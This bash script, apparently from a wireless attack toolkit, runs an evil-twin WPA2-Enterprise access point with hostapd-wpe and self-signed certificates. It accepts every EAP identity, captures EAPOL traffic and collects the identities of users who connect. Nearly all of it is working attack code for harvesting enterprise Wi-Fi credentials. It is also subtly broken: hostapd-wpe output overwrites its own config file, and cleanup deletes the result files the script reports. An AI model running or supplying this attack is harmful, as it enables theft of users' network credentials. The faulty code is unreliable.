#!/usr/bin/env bash
# Enterprise 802.1X/RADIUS attack
# Usage: enterprise_attack.sh <interface> <ssid>

set -euo pipefail

_log()   { echo "$*" >&2; }
_json()  { printf '%s\n' "$*"; }
_die()   { _json "{\"status\":\"error\",\"message\":\"$1\"}"; exit 1; }

cleanup() {
    _log "[*] Cleaning up Enterprise attack..."
    for pidvar in HOSTAPD_PID RADIUS_PID AIRODUMP_PID; do
        if [[ -n "${!pidvar:-}" ]]; then
            kill "${!pidvar}" 2>/dev/null || true
            wait "${!pidvar}" 2>/dev/null || true
        fi
    done
    rm -rf "${TMPDIR_WORK:-}" 2>/dev/null || true
    exit "${EXIT_RC:-0}"
}
trap cleanup EXIT

# ── Root check ────────────────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    _die "Root privileges required"
fi

# ── Dependency check ──────────────────────────────────────────────────
for cmd in hostapd-wpe hostapd radiusd tshark hcxdumptool; do
    if ! command -v "$cmd" &>/dev/null; then
        _log "[!] $cmd not found"
    fi
done

# ── Args ──────────────────────────────────────────────────────────────
IFACE="${1:-}"
SSID="${2:-EnterpriseAP}"

if [[ -z "$IFACE" ]]; then
    _die "Usage: enterprise_attack.sh <interface> <ssid>"
fi

if [[ ! -d "/sys/class/net/$IFACE" ]]; then
    _die "Interface '$IFACE' does not exist"
fi

# ── Setup ─────────────────────────────────────────────────────────────
TMPDIR_WORK=$(mktemp -d /tmp/wafford_enterprise.XXXXXX)
HOSTAPD_CONF="${TMPDIR_WORK}/hostapd-wpe.conf"
IDENTITIES_FILE="${TMPDIR_WORK}/eap_identities.log"
AP_IP="10.0.0.1"

_log "[*] Enterprise attack: SSID=$SSID iface=$IFACE"

# ── Configure interface ───────────────────────────────────────────────
ip link set "$IFACE" down 2>/dev/null || true
ip addr flush dev "$IFACE" 2>/dev/null || true
ip addr add "${AP_IP}/24" dev "$IFACE" 2>/dev/null || true
ip link set "$IFACE" up 2>/dev/null || true

# ── Generate hostapd-wpe.conf ────────────────────────────────────────
cat > "$HOSTAPD_CONF" <<EOF
interface=$IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=6

# WPA2 Enterprise
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
eapol_key_index_workaround=0

# EAP types
ieee8021x=1
eap_server=1
eap_authenc=0
eap_user_file=${TMPDIR_WORK}/hostapd.eap_user
ca_cert=/etc/ssl/certs/ssl-cert-snakeoil.pem
server_cert=/etc/ssl/certs/ssl-cert-snakeoil.pem
private_key=/etc/ssl/private/ssl-cert-snakeoil.key
dh_file=/etc/ssl/certs/ssl-cert-snakeoil.pem

# Open RADIUS server settings
own_ip_addr=$AP_IP
auth_server_addr=$AP_IP
auth_server_port=1812
radius_server_auth_port=1812
EOF

# EAP user file — allow ALL identities (harvesting mode)
cat > "${TMPDIR_WORK}/hostapd.eap_user" <<'EOF'
*		PEAP,TTLS,TLS
"user"	MD5,"password"
EOF

# Check for certs, generate if missing
CERT_DIR="${TMPDIR_WORK}/certs"
mkdir -p "$CERT_DIR"

if [[ ! -f "$CERT_DIR/server.pem" ]]; then
    _log "[*] Generating self-signed certificates..."
    if command -v openssl &>/dev/null; then
        openssl req -x509 -newkey rsa:2048 \
            -keyout "$CERT_DIR/server.key" \
            -out "$CERT_DIR/server.pem" \
            -days 365 -nodes \
            -subj "/C=US/ST=State/L=City/O=Wafford/CN=$SSID" \
            2>/dev/null || true
    fi
fi

# ── Start airodump-ng to monitor ─────────────────────────────────────
LOG_COMMAND=""
if command -v tshark &>/dev/null; then
    _log "[*] Starting packet capture..."
    tshark -i "$IFACE" -f "eapol" -w "${TMPDIR_WORK}/eap_capture.pcapng" 2>/dev/null &
    AIRODUMP_PID=$!
elif command -v tcpdump &>/dev/null; then
    _log "[*] Starting packet capture..."
    tcpdump -i "$IFACE" -w "${TMPDIR_WORK}/eap_capture.pcap" "eapol" 2>/dev/null &
    AIRODUMP_PID=$!
fi

# ── Start hostapd-wpe ────────────────────────────────────────────────
if command -v hostapd-wpe &>/dev/null; then
    _log "[*] Starting hostapd-wpe..."
    hostapd-wpe "$HOSTAPD_CONF" > "${TMPDIR_WORK}/hostapd-wpe.conf" 2>&1 &
    HOSTAPD_PID=$!
else
    _log "[!] hostapd-wpe not found, using regular hostapd"
    hostapd "$HOSTAPD_CONF" -B > "${TMPDIR_WORK}/hostapd.log" 2>&1 || true
    sleep 1
    HOSTAPD_PID=$(pgrep -x hostapd | head -1 || echo "")
fi

sleep 2

if [[ -z "$HOSTAPD_PID" ]] || ! kill -0 "$HOSTAPD_PID" 2>/dev/null; then
    _die "Failed to start hostapd-wpe"
fi

# ── Monitor for EAP identities ───────────────────────────────────────
_log "[*] Enterprise AP active. Monitoring for EAP identities..."

CAPTURED_IDENTITIES=0

while kill -0 "$HOSTAPD_PID" 2>/dev/null; do
    sleep 5

    # Method 1: Check hostapd log for identity responses
    for logfile in "${TMPDIR_WORK}"/*.log "${TMPDIR_WORK}"/*.conf; do
        if [[ -f "$logfile" ]]; then
            IDENTITIES=$(grep -oP 'Identity:[^\s]+' "$logfile" 2>/dev/null | sort -u | wc -l || echo "0")
            if [[ "$IDENTITIES" -gt "$CAPTURED_IDENTITIES" ]]; then
                CAPTURED_IDENTITIES="$IDENTITIES"
            fi
        fi
    done

    # Method 2: Parse EAP identities from capture
    if command -v tshark &>/dev/null && [[ -f "${TMPDIR_WORK}/eap_capture.pcapng" ]]; then
        NEW_IDENTITIES=$(tshark -r "${TMPDIR_WORK}/eap_capture.pcapng" \
            -Y "eap && eap.code==2" \
            -T fields -e eap.identity 2>/dev/null | wc -l || echo "0")
        if [[ "$NEW_IDENTITIES" -gt "$CAPTURED_IDENTITIES" ]]; then
            CAPTURED_IDENTITIES="$NEW_IDENTITIES"
            _log "[+] Captured $CAPTURED_IDENTITIES EAP identities"
        fi
    fi

    _log "[*] Monitoring... identities captured: $CAPTURED_IDENTITIES"
done

# ── Collect final results ─────────────────────────────────────────────
# Extract identities from logs
IDENTITY_LIST=""
if command -v tshark &>/dev/null && [[ -f "${TMPDIR_WORK}/eap_capture.pcapng" ]]; then
    IDENTITY_LIST=$(tshark -r "${TMPDIR_WORK}/eap_capture.pcapng" \
        -Y "eap && eap.code==2" \
        -T fields -e eap.identity 2>/dev/null | sort -u | tr '\n' ',' | sed 's/,$//' || echo "")
fi

# Also capture from hostapd-wpe radsecproxy logs
if [[ -f "${TMPDIR_WORK}/hostapd-wpe.conf" ]]; then
    IDENTITY_LIST="$IDENTITY_LIST,$(grep -oP 'Identity:\s*\K[^\s,]+' "${TMPDIR_WORK}/hostapd-wpe.conf" 2>/dev/null | sort -u | tr '\n' ',' | sed 's/,$//' || echo '')"
fi
IDENTITY_LIST=$(echo "$IDENTITY_LIST" | sed 's/^,//;s/,,*/,/g;s/,$//')

if [[ -n "$IDENTITY_LIST" ]]; then
    echo "$IDENTITY_LIST" | tr ',' '\n' > "$IDENTITIES_FILE"
fi

# ── Output ────────────────────────────────────────────────────────────
_json "{\"status\":\"success\",\"action\":\"completed\",\"interface\":\"${IFACE}\",\"ssid\":\"${SSID}\",\"captured_identities\":${CAPTURED_IDENTITIES},\"identities_file\":\"${TMPDIR_WORK}/eap_identities.log\",\"capture_file\":\"${TMPDIR_WORK}/eap_capture.pcapng\"}"
